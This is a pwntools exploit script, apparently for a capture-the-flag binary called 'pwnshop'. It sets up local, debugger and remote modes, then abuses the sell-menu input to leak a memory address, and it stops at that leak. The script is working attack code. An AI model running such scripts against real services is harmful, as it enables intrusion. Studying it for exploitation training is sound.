#!/usr/bin/python3
# Author: Hack.You
from pwn import *
import warnings

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
piebase
breakrva 0x40c0
continue
'''.format(**locals())

# Binary filename
exe = './pwnshop'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'
warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()


# Send the payload
io.sendlineafter('>', '2')
io.sendlineafter('What do you wish to sell?', 'lol')
io.sendlineafter('How much do you want for it?', 'A' * 7)  # Leak address
io.recvuntil('A\n')
leaked = unpack(io.recv()[:6].ljust(8, b"\x00"))
info("Leaked address: %#x", leaked)

#io.interactive()
